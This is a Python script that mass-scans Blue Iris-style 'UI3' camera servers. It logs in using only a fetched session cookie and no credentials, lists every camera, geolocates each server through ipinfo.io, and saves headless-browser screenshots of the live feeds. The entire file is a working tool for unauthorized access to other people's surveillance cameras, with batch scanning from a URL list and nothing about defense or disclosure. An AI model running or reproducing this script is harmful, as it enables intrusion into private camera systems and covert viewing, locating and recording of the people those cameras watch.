import requests
import json
import os
import asyncio
import datetime
import argparse
from urllib.parse import urlparse
from playwright.async_api import async_playwright

FILTER_KEYS = {
    "system name", "admin", "ptz", "audio", "clips", "version",
    "support", "user", "latitude", "longitude", "streams", "profiles"
}

def extract_ip_port(url):
    parsed_url = urlparse(url)
    ip = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)
    return ip, port

def create_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)

def get_ip_info(ip):
    """ Récupère les informations de l'IP depuis ipinfo.io """
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return f"{data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')} | ISP: {data.get('org', 'Unknown')}"
        else:
            return "IP info unavailable"
    except requests.exceptions.RequestException:
        return "IP info unavailable"

async def capture_page_screenshot(url, save_path):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        try:
            await page.goto(url, timeout=10000)
            await asyncio.sleep(2)
            await page.screenshot(path=save_path, full_page=True)
            print(f"CATCHED : {save_path}")
        except Exception as e:
            print(f"[!] Error while capturing {url} : {e}")
        finally:
            await browser.close()

async def scan_server(base_url, capture=False, save_info=False):
    sv_ip, sv_port = extract_ip_port(base_url)
    print(f"\n[*] Scanning {base_url} (IP: {sv_ip}, Port: {sv_port})\n")

    session = requests.Session()
    headers_common = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive"
    }

    try:
        response_ui3 = session.get(f"{base_url}/ui3.htm", headers=headers_common, timeout=5)
        if response_ui3.status_code != 200:
            print(f"[!] {sv_ip}:{sv_port} not found.")
            return ""

        session_cookie = session.cookies.get_dict().get("session", "N/A")
        if session_cookie == "N/A":
            print("[!] Unable to retrieve session cookie.")
            return ""

        print(f"[+] SERVER fetched ! session COOKIE : {session_cookie}")

        login_payload = json.dumps({"cmd": "login", "session": session_cookie})
        headers_login = {
            **headers_common,
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "text/plain",
            "Origin": base_url,
            "Referer": f"{base_url}/ui3.htm",
            "Cookie": f"session={session_cookie}"
        }

        login_url = f"{base_url}/json?_login"
        response_login = session.post(login_url, headers=headers_login, data=login_payload, timeout=5)

        if response_login.status_code == 200:
            try:
                response_json = response_login.json()
                if response_json.get("result") == "success":
                    session_id = response_json.get("session")
                    print(f"[+] AUTH successful! session ID : {session_id}\n")

                    main_panel_url = f"{base_url}/ui3.htm?t=live&group=Index"
                    ip_info = get_ip_info(sv_ip)
                    print(f"[+] PANEL : {main_panel_url}\n    → {ip_info}\n")

                    camlist_payload = json.dumps({"cmd": "camlist", "session": session_id})
                    camlist_url = f"{base_url}/json?_camlist"

                    response_camlist = session.post(camlist_url, headers=headers_login, data=camlist_payload, timeout=5)

                    if response_camlist.status_code == 200:
                        try:
                            camlist_json = response_camlist.json()
                            camlist_data = camlist_json.get("data", [])

                            if isinstance(camlist_data, list):
                                base_path = f"captures/{sv_ip}"
                                create_directory(base_path)

                                info_text = f"Server IP: {sv_ip}\nPanel: {main_panel_url}\nIP Info: {ip_info}\n\nCameras:\n"

                                screenshot_tasks = []

                                for cam in camlist_data:
                                    if "optionValue" in cam:
                                        cam_name = cam["optionValue"]
                                        cam_display = cam.get("optionDisplay", "Inconnu")
                                        cam_url = f"{base_url}/ui3.htm?t=live&cam={cam_name}"

                                        print(f"[CONNECTED] {cam_display}  →  {cam_url}")
                                        info_text += f"- {cam_display} ({cam_url})\n"

                                        if capture:
                                            cam_capture_path = os.path.join(base_path, cam_name)
                                            create_directory(cam_capture_path)

                                            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                                            capture_filename = f"capture_{timestamp}.png"
                                            capture_full_path = os.path.join(cam_capture_path, capture_filename)

                                            screenshot_tasks.append(capture_page_screenshot(cam_url, capture_full_path))

                                if save_info:
                                    info_file = os.path.join(base_path, "info.txt")
                                    with open(info_file, "w", encoding="utf-8") as f:
                                        f.write(info_text)
                                    print(f"[+] Infos saved in {info_file}")

                                await asyncio.gather(*screenshot_tasks)

                                return info_text

                            else:
                                print("[!] Camera response is not a valid list.")

                        except json.JSONDecodeError:
                            print("[!] JSON parsing error for /json?_camlist.")

                    else:
                        print(f"[!] Camera recovery failed (HTTP {response_camlist.status_code})")

            except json.JSONDecodeError:
                print("[!] JSON parsing error for /json?_login.")

        print("[!] Unable to authenticate on this server.")

    except requests.exceptions.RequestException as e:
        print(f"[!] Network error :  {e}")

    return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UI3 authentication scan with camera screen capture")
    parser.add_argument("-u", "--url", help="Scan a single IP")
    parser.add_argument("-a", "--all", action="store_true", help="Scan with info + capture")
    parser.add_argument("-i", "--info", action="store_true", help="Scan info only")
    parser.add_argument("-l", "--list", type=str, help="Scan from a file containing URLs (one per line)")

    args = parser.parse_args()

    if args.url:
        result = asyncio.run(scan_server(args.url, capture=args.all, save_info=args.all or args.info))
        if result:
            with open("all_servers.txt", "w", encoding="utf-8") as f:
                f.write(result + "\n")

    elif args.list:
        if os.path.exists(args.list):
            with open(args.list, "r") as file:
                urls = [line.strip() for line in file if line.strip()]
            
            async def run_scans():
                all_results = []
                for url in urls:
                    result = await scan_server(url, capture=False, save_info=True)
                    if result:
                        all_results.append(result)
                
                with open("all_servers.txt", "w", encoding="utf-8") as f:
                    f.write("\n\n".join(all_results))
                print("[+] All scan results saved in all_servers.txt")

            asyncio.run(run_scans())

        else:
            print(f"[!] File '{args.list}' not found!")
